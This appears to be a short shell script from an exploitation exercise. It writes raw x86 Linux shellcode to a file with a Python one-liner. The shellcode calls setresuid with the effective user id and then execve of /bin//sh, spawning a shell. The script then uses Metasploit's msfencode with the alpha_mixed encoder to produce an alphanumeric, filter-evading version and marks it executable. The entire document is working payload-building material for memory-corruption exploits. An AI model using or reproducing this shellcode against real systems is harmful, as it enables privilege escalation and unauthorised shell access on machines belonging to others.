#!/bin/sh
python -c 'print "\x90\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x89\xc2\x31\xc0\xb0\xa4\xcd\x80\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"' > sc.bin

# msfencode BufferRegister=ECX -i sc.bin -e x86/alpha_mixed -t python -b '\x69\x49'
msfencode BufferRegister=ECX -i sc.bin -e x86/alpha_mixed -t elf > sc_encoded.bin
chmod +x sc_encoded.bin
